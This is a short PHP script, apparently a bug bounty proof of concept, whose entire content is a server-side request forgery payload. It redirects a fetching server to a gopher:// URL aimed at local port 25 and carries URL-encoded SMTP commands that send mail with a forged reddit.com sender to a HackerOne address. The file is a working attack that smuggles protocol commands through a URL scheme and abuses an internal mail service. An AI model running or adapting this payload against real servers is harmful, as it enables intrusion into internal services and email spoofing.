<?php
        $commands = array(
                'HELO uber.com',
                'MAIL FROM: <admin@reddit.com>',
                'RCPT To: <54v4n7@wearehackerone.com>',
                'DATA',
                'Subject: corben!',
                'Corben (cdl) was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
